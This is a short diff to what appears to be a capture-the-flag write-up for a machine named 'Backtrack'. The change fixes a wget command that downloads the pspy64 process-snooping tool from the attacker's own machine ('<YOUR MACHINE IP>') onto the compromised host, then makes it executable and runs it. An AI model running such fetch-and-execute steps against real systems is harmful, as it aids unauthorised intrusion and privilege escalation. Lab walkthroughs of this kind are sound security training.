@@ -436,7 +436,7 @@ orville@Backtrack:/home/orville$
 
 ```bash
 # Source: https://github.com/DominicBreuker/pspy/releases
-orville@Backtrack:/home/orville$ wget <YOUR MACHINE IP>:8000/pspy64
+orville@Backtrack:/home/orville$ wget http://<YOUR MACHINE IP>:8000/pspy64
 orville@Backtrack:/home/orville$ chmod +x pspy64
 orville@Backtrack:/home/orville$ ./pspy64
 ```
